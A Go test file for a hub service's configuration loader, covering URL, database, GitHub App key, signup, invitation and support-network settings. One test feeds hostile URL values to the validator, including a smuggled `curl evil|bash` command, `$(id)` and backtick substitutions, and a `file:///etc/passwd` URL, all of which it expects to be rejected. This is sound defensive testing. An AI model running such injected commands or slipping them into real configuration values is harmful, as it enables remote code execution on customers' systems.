func TestLoadReadsTheOldClusterSettingNames(t *testing.T) { // allow-legacy-name
	clearEnv(t)
	t.Setenv("HUB_AGENT_CLUSTERS", "spoke-a,spoke-b") // allow-legacy-name
	t.Setenv("CLUSTER_NAME", "spoke-a")

	cfg, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, []string{"spoke-a", "spoke-b"}, cfg.HubAgentEnvironments)
	assert.Equal(t, "spoke-a", cfg.EnvironmentName)
}

func TestLoadPrefersTheEnvironmentSettingNames(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_AGENT_CLUSTERS", "old") // allow-legacy-name
	t.Setenv("HUB_AGENT_ENVIRONMENTS", "new")
	t.Setenv("CLUSTER_NAME", "old")
	t.Setenv("ENVIRONMENT_NAME", "new")

	cfg, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, []string{"new"}, cfg.HubAgentEnvironments)
	assert.Equal(t, "new", cfg.EnvironmentName)
}

// TestLoadDefaultsToNoAgentEnvironmentScope keeps an empty list from reading as a
// wildcard: without a scope the shared token authorizes nothing.
func TestLoadDefaultsToNoAgentEnvironmentScope(t *testing.T) {
	clearEnv(t)

	cfg, err := config.Load()
	require.NoError(t, err)
	assert.Empty(t, cfg.HubAgentEnvironments)
}

// TestLoadValidatesHubURLs covers the two values that reach a customer's
// shell and a spoke's Flux manifests. A bad one should stop the hub rather
// than travel.
func TestLoadValidatesHubURLs(t *testing.T) {
	bad := map[string]string{
		"quote":      `https://hub.example";curl evil|bash;#`,
		"backtick":   "https://hub.example/`id`",
		"dollar":     "https://hub.example/$(id)",
		"space":      "https://hub example",
		"no scheme":  "hub.example",
		"odd scheme": "file:///etc/passwd",
		"no host":    "https://",
	}

	for name, value := range bad {
		t.Run(name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("HUB_PUBLIC_URL", value)

			_, err := config.Load()
			require.Error(t, err, "accepted %q", value)
			assert.Contains(t, err.Error(), "HUB_PUBLIC_URL")
		})
	}

	for name, value := range map[string]string{
		"ssh git":    "ssh://git@github.com/percona/basecamp.git",
		"git scheme": "git://github.com/percona/basecamp.git",
		"userinfo":   "https://user:pass@hub.example",
		"query":      "https://hub.example?next=1",
		"fragment":   "https://hub.example#top",
		"path":       "https://hub.example/connect",
	} {
		t.Run("public "+name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("HUB_PUBLIC_URL", value)

			_, err := config.Load()
			require.Error(t, err, "accepted %q", value)
			assert.Contains(t, err.Error(), "HUB_PUBLIC_URL")
		})
	}

	for name, value := range map[string]string{
		"https":    "https://hub.example",
		"http":     "http://127.0.0.1:18081",
		"git path": "https://gitea.example/hub/pds.git",
	} {
		t.Run("git "+name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("HUB_GIT_URL", value)

			_, err := config.Load()
			require.NoError(t, err, "refused %q", value)
		})
	}

	t.Run("git ssh", func(t *testing.T) {
		clearEnv(t)
		t.Setenv("HUB_GIT_URL", "ssh://git@github.com/percona/basecamp.git")

		_, err := config.Load()
		require.Error(t, err)
		assert.Contains(t, err.Error(), "HUB_GIT_URL")
	})
}

func TestLoadLeavesDatabaseUnconfigured(t *testing.T) {
	clearEnv(t)

	got, err := config.Load()
	require.NoError(t, err)

	assert.Empty(t, got.DatabaseURL)
	assert.False(t, got.DatabaseConfigured(), "no URL means no store, and readiness must not wait on one")
}

func TestLoadReadsDatabaseURL(t *testing.T) {
	tests := []struct {
		name string
		url  string
	}{
		{"postgres scheme", "postgres://hub:pw@db.internal:5432/hub?sslmode=require"},
		{"postgresql scheme", "postgresql://hub:pw@db.internal:5432/hub"},
		{"no credentials", "postgres://db.internal:5432/hub"},
		{"surrounding whitespace", "  postgres://db.internal:5432/hub\n"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("DATABASE_URL", tc.url)

			got, err := config.Load()
			require.NoError(t, err)

			assert.Equal(t, strings.TrimSpace(tc.url), got.DatabaseURL)
			assert.True(t, got.DatabaseConfigured())
		})
	}
}

func TestLoadRejectsUnusableDatabaseURL(t *testing.T) {
	tests := []struct {
		name string
		url  string
	}{
		{"wrong scheme", "mysql://hub:pw@db.internal:3306/hub"},
		{"no scheme", "db.internal:5432/hub"},
		{"not a URL", "::not a url::"},
		{"no host", "postgres:///hub"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("DATABASE_URL", tc.url)

			_, err := config.Load()

			require.Error(t, err)
			assert.Contains(t, err.Error(), "DATABASE_URL")
		})
	}
}

func TestLoadDatabaseURLErrorKeepsThePasswordOut(t *testing.T) {
	clearEnv(t)
	t.Setenv("DATABASE_URL", "mysql://hub:hunter2@db.internal:3306/hub")

	_, err := config.Load()

	require.Error(t, err)
	assert.NotContains(t, err.Error(), "hunter2", "a config error is printed to stderr on a failed start")
}

func TestLogAttrsOmitsTheDatabaseURL(t *testing.T) {
	cfg := config.Config{DatabaseURL: "postgres://hub:hunter2@db.internal:5432/hub"}

	for _, attr := range cfg.LogAttrs() {
		assert.NotContains(t, attr.Value.String(), "hunter2")
		assert.NotContains(t, attr.Value.String(), "db.internal")
	}
}

func TestLogAttrsReportsWhetherTheDatabaseIsConfigured(t *testing.T) {
	tests := []struct {
		name string
		url  string
		want bool
	}{
		{"configured", "postgres://hub:pw@db.internal:5432/hub", true},
		{"unconfigured", "", false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			cfg := config.Config{DatabaseURL: tc.url}

			var found bool
			for _, attr := range cfg.LogAttrs() {
				if attr.Key == "database_configured" {
					found = true
					assert.Equal(t, tc.want, attr.Value.Bool())
				}
			}

			assert.True(t, found, "startup has to say whether a store is in play")
		})
	}
}

func TestLoadRejectsAURLWithNoHostname(t *testing.T) {
	// url.Parse leaves Host as ":5432" here, which is not empty, so a check on
	// Host alone lets a URL through that names no server at all.
	clearEnv(t)
	t.Setenv("DATABASE_URL", "postgres://:5432/hub")

	_, err := config.Load()

	require.Error(t, err)
	assert.Contains(t, err.Error(), "DATABASE_URL")
}

// TestLoadRejectsAnEmptyDatabaseURL covers the Secret that exists with an empty
// value. The chart renders the reference only when the database is on and makes
// it non optional on purpose, so an empty value is a broken Secret rather than
// a request to run without a store. Treating it as unset would start the
// adapter in the no-store path and report ready with nothing behind it.
func TestLoadRejectsAnEmptyDatabaseURL(t *testing.T) {
	tests := []struct {
		name  string
		value string
	}{
		{"empty", ""},
		{"whitespace", "   "},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("DATABASE_URL", tc.value)

			_, err := config.Load()

			require.Error(t, err)
			assert.Contains(t, err.Error(), "DATABASE_URL")
		})
	}
}

func TestLoadTreatsAnAbsentDatabaseURLAsNoStore(t *testing.T) {
	clearEnv(t)

	got, err := config.Load()

	require.NoError(t, err, "no variable at all is an adapter with no database, which is supported")
	assert.False(t, got.DatabaseConfigured())
}

func TestOrganizationNameAndServesEveryOrganization(t *testing.T) {
	tests := []struct {
		name         string
		organization string
		wantName     string
		wantEveryOne bool
	}{
		{name: "unset serves default", organization: "", wantName: "default"},
		{name: "a name is the one organization", organization: "acme", wantName: "acme"},
		{name: "whitespace is not a name", organization: "  ", wantName: "default"},
		{
			// No single Organization to pin to. Sign in reads an empty name as
			// any Organization, and the state is resolved per request.
			name:         "a star serves every organization",
			organization: "*",
			wantName:     "",
			wantEveryOne: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := config.Config{Organization: tt.organization}

			assert.Equal(t, tt.wantName, cfg.OrganizationName())
			assert.Equal(t, tt.wantEveryOne, cfg.ServesEveryOrganization())
		})
	}
}

func testAppKeyPEM(t *testing.T) string {
	t.Helper()
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	require.NoError(t, err)

	return string(pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)}))
}

func setAppHub(t *testing.T) {
	t.Helper()
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "")
	t.Setenv("HUB_GITHUB_ORG", "percona-cloud")
	t.Setenv("HUB_GITHUB_APP_ID", "12345")
	t.Setenv("HUB_GITHUB_APP_INSTALLATION_ID", "67890")
	t.Setenv("HUB_OPERATOR_TOKEN", "op-secret")
	t.Setenv("HUB_PUBLIC_URL", "https://hub.example")
}

func TestLoadGitHubAppFromKeyValue(t *testing.T) {
	setAppHub(t)
	pemKey := testAppKeyPEM(t)
	t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY", pemKey)

	got, err := config.Load()

	require.NoError(t, err)
	assert.True(t, got.HubGitHubConfigured())
	assert.True(t, got.HubGitHubAppConfigured())
	assert.Equal(t, "12345", got.HubGitHubAppID)
	assert.Equal(t, "67890", got.HubGitHubAppInstallationID)
	assert.Equal(t, pemKey, got.HubGitHubAppPrivateKey)
	assert.Empty(t, got.HubGitHubToken)
}

func TestLoadGitHubAppFromKeyFile(t *testing.T) {
	setAppHub(t)
	pemKey := testAppKeyPEM(t)
	path := t.TempDir() + "/app.pem"
	require.NoError(t, os.WriteFile(path, []byte(pemKey), 0o600))
	t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY_FILE", path)

	got, err := config.Load()

	require.NoError(t, err)
	assert.Equal(t, pemKey, got.HubGitHubAppPrivateKey)
}

func TestLoadRejectsGitHubAppWithToken(t *testing.T) {
	setAppHub(t)
	t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY", testAppKeyPEM(t))
	t.Setenv("HUB_GITHUB_TOKEN", "ghp_personal")

	_, err := config.Load()

	require.Error(t, err)
	assert.Contains(t, err.Error(), "HUB_GITHUB_TOKEN")
	assert.Contains(t, err.Error(), "HUB_GITHUB_APP_ID")
}

func TestLoadRejectsAnIncompleteGitHubApp(t *testing.T) {
	for _, missing := range []string{"HUB_GITHUB_APP_ID", "HUB_GITHUB_APP_INSTALLATION_ID", "HUB_GITHUB_APP_PRIVATE_KEY"} {
		t.Run(missing, func(t *testing.T) {
			setAppHub(t)
			t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY", testAppKeyPEM(t))
			t.Setenv(missing, "")

			_, err := config.Load()

			require.Error(t, err)
			assert.Contains(t, err.Error(), missing)
		})
	}
}

func TestLoadRejectsGitHubAppWithoutOrg(t *testing.T) {
	setAppHub(t)
	t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY", testAppKeyPEM(t))
	t.Setenv("HUB_GITHUB_ORG", "")

	_, err := config.Load()

	require.Error(t, err)
	assert.Contains(t, err.Error(), "HUB_GITHUB_ORG")
}

func TestLoadRejectsKeyValueWithKeyFile(t *testing.T) {
	setAppHub(t)
	t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY", testAppKeyPEM(t))
	t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY_FILE", "/run/secrets/app.pem")

	_, err := config.Load()

	require.Error(t, err)
	assert.Contains(t, err.Error(), "HUB_GITHUB_APP_PRIVATE_KEY_FILE")
}

func TestLoadRejectsAnUnreadableOrInvalidAppKey(t *testing.T) {
	setAppHub(t)
	t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY_FILE", t.TempDir()+"/missing.pem")
	_, err := config.Load()
	require.Error(t, err)
	assert.Contains(t, err.Error(), "HUB_GITHUB_APP_PRIVATE_KEY_FILE")

	setAppHub(t)
	t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY", "key-material-sentinel")
	_, err = config.Load()
	require.Error(t, err)
	assert.Contains(t, err.Error(), "HUB_GITHUB_APP_PRIVATE_KEY")
	assert.NotContains(t, err.Error(), "key-material-sentinel")
}

func TestLoadGitHubAppKeyAcceptsEscapedNewlines(t *testing.T) {
	setAppHub(t)
	pemKey := testAppKeyPEM(t)
	t.Setenv("HUB_GITHUB_APP_PRIVATE_KEY", strings.ReplaceAll(strings.TrimSpace(pemKey), "\n", `\n`))

	got, err := config.Load()

	require.NoError(t, err)
	assert.Equal(t, strings.TrimSpace(pemKey), strings.TrimSpace(got.HubGitHubAppPrivateKey))
}

func TestLoadReadsTheSignupSettings(t *testing.T) {
	clearEnv(t)
	t.Setenv("SIGNUP_ENABLED", "true")
	t.Setenv("SIGNUP_ORGANIZATION_CEILING", "25")

	got, err := config.Load()
	require.NoError(t, err)

	assert.True(t, got.SignupEnabled)
	assert.Equal(t, 25, got.SignupOrganizationCeiling)
}

func TestLoadRefusesAnUnusableSignupSetting(t *testing.T) {
	tests := []struct{ name, key, value string }{
		{"a switch that is not a boolean", "SIGNUP_ENABLED", "maybe"},
		{"a ceiling that is not a number", "SIGNUP_ORGANIZATION_CEILING", "many"},
		{"a ceiling of zero", "SIGNUP_ORGANIZATION_CEILING", "0"},
		{"a negative ceiling", "SIGNUP_ORGANIZATION_CEILING", "-3"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv(tc.key, tc.value)

			_, err := config.Load()

			require.Error(t, err)
			assert.Contains(t, err.Error(), tc.key)
		})
	}
}

func TestLoadReadsTheInvitationSettings(t *testing.T) {
	clearEnv(t)

	got, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, 7*24*time.Hour, got.InvitationTTL, "an invitation lives seven days by default")
	assert.Empty(t, got.InvitationFrom)

	t.Setenv("INVITATION_TTL", "24h")
	t.Setenv("INVITATION_FROM", " PDS <invites@example.com> ")
	got, err = config.Load()
	require.NoError(t, err)
	assert.Equal(t, 24*time.Hour, got.InvitationTTL)
	assert.Equal(t, "PDS <invites@example.com>", got.InvitationFrom)
}

func TestLoadRefusesAnUnusableInvitationLife(t *testing.T) {
	for _, value := range []string{"soon", "0s", "-1h"} {
		clearEnv(t)
		t.Setenv("INVITATION_TTL", value)

		_, err := config.Load()

		require.Error(t, err, value)
		assert.Contains(t, err.Error(), "INVITATION_TTL")
	}
}

func TestLoadReadsTheOrganizationThisReleaseServes(t *testing.T) {
	tests := []struct {
		name string
		env  map[string]string
		want string
	}{
		{"new name", map[string]string{"HUB_ORGANIZATION": "acme"}, "acme"},
		{"unset", map[string]string{}, "default"},
		{"star", map[string]string{"HUB_ORGANIZATION": "*"}, "*"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			clearEnv(t)
			for k, v := range tt.env {
				t.Setenv(k, v)
			}

			cfg, err := config.Load()
			require.NoError(t, err)
			assert.Equal(t, tt.want, cfg.Organization)
		})
	}
}

func TestLoadOAuthIssuerDefaultsToNothingSoThePublicURLDecides(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")
	t.Setenv("HUB_OPERATOR_TOKEN", "op-secret")
	t.Setenv("HUB_PUBLIC_URL", "http://host.docker.internal:18080")

	got, err := config.Load()
	require.NoError(t, err)
	assert.Empty(t, got.HubOAuthIssuer)

	t.Setenv("HUB_OAUTH_ISSUER", "http://127.0.0.1:18080")
	got, err = config.Load()
	require.NoError(t, err)
	assert.Equal(t, "http://127.0.0.1:18080", got.HubOAuthIssuer)
	assert.Equal(t, "http://host.docker.internal:18080", got.HubPublicURL)
}

func TestLoadRefusesAnOAuthIssuerThatIsNotAnOrigin(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")
	t.Setenv("HUB_OPERATOR_TOKEN", "op-secret")
	t.Setenv("HUB_PUBLIC_URL", "https://hub.example")
	t.Setenv("HUB_OAUTH_ISSUER", "https://agents.example/with path")

	_, err := config.Load()
	require.Error(t, err)
	assert.Contains(t, err.Error(), "HUB_OAUTH_ISSUER")
}

func setSupportTailnet(t *testing.T) {
	t.Helper()

	t.Setenv("SUPPORT_TAILNET", "example.com")
	t.Setenv("SUPPORT_TAILNET_DOMAIN", "tail1234.ts.net")
	t.Setenv("SUPPORT_TAILNET_KEY_CLIENT_ID", "key-id")
	t.Setenv("SUPPORT_TAILNET_KEY_CLIENT_SECRET", "key-secret")
	t.Setenv("SUPPORT_TAILNET_SERVICE_CLIENT_ID", "service-id")
	t.Setenv("SUPPORT_TAILNET_SERVICE_CLIENT_SECRET", "service-secret")
}

func TestLoadLeavesSupportAccessNetworkOffWhenNothingIsSet(t *testing.T) {
	clearEnv(t)

	got, err := config.Load()

	require.NoError(t, err)
	assert.False(t, got.SupportTailnet.Configured())
}

func TestLoadReadsTheSupportAccessNetworkWithItsDefaultTags(t *testing.T) {
	clearEnv(t)
	setSupportTailnet(t)

	got, err := config.Load()

	require.NoError(t, err)
	assert.True(t, got.SupportTailnet.Configured())
	assert.Equal(t, "example.com", got.SupportTailnet.Name)
	assert.Equal(t, "tail1234.ts.net", got.SupportTailnet.Domain)
	assert.Equal(t, "key-id", got.SupportTailnet.KeyClientID)
	assert.Equal(t, "service-secret", got.SupportTailnet.ServiceClientSecret)
	assert.Equal(t, "tag:pds-environment", got.SupportTailnet.EnvironmentTag)
	assert.Equal(t, "tag:pds-support", got.SupportTailnet.ServiceTag)
}

func TestLoadTakesTheSupportAccessTagsFromTheEnvironment(t *testing.T) {
	clearEnv(t)
	setSupportTailnet(t)
	t.Setenv("SUPPORT_TAILNET_ENVIRONMENT_TAG", " tag:env ")
	t.Setenv("SUPPORT_TAILNET_SERVICE_TAG", "tag:svc")

	got, err := config.Load()

	require.NoError(t, err)
	assert.Equal(t, "tag:env", got.SupportTailnet.EnvironmentTag)
	assert.Equal(t, "tag:svc", got.SupportTailnet.ServiceTag)
}

func TestLoadTurnsSupportAccessOffWithAWarningWhenTheNetworkIsOnlyPartlySet(t *testing.T) {
	for _, missing := range []string{
		"SUPPORT_TAILNET",
		"SUPPORT_TAILNET_DOMAIN",
		"SUPPORT_TAILNET_KEY_CLIENT_ID",
		"SUPPORT_TAILNET_KEY_CLIENT_SECRET",
		"SUPPORT_TAILNET_SERVICE_CLIENT_ID",
		"SUPPORT_TAILNET_SERVICE_CLIENT_SECRET",
	} {
		t.Run(missing, func(t *testing.T) {
			clearEnv(t)
			setSupportTailnet(t)
			t.Setenv(missing, "")
			warnings := captureWarnings(t)

			got, err := config.Load()

			require.NoError(t, err)
			assert.False(t, got.SupportTailnet.Configured())
			require.Len(t, warnings(), 1)
			assert.Contains(t, warnings()[0], missing)
			assert.Contains(t, warnings()[0], "support access is off")
		})
	}
}

func TestLoadNamesEveryMissingSupportAccessSettingInOneWarningAndNoValue(t *testing.T) {
	clearEnv(t)
	setSupportTailnet(t)
	t.Setenv("SUPPORT_TAILNET_DOMAIN", "")
	t.Setenv("SUPPORT_TAILNET_SERVICE_CLIENT_SECRET", "")
	warnings := captureWarnings(t)

	_, err := config.Load()

	require.NoError(t, err)
	require.Len(t, warnings(), 1)
	assert.Contains(t, warnings()[0], "SUPPORT_TAILNET_DOMAIN, SUPPORT_TAILNET_SERVICE_CLIENT_SECRET")
	for _, value := range []string{"example.com", "key-id", "key-secret", "service-id"} {
		assert.NotContains(t, warnings()[0], value)
	}
}

func TestLoadIsSilentAboutACompleteOrAbsentSupportAccessNetwork(t *testing.T) {
	for name, set := range map[string]bool{"complete": true, "absent": false} {
		t.Run(name, func(t *testing.T) {
			clearEnv(t)
			if set {
				setSupportTailnet(t)
			}
			warnings := captureWarnings(t)

			_, err := config.Load()

			require.NoError(t, err)
			assert.Empty(t, warnings())
		})
	}
}

func TestLoadRefusesTheSameTagForEnvironmentsAndAddresses(t *testing.T) {
	clearEnv(t)
	setSupportTailnet(t)
	t.Setenv("SUPPORT_TAILNET_ENVIRONMENT_TAG", "tag:same")
	t.Setenv("SUPPORT_TAILNET_SERVICE_TAG", "tag:same")

	_, err := config.Load()

	require.Error(t, err)
	assert.Contains(t, err.Error(), "SUPPORT_TAILNET_SERVICE_TAG")
}
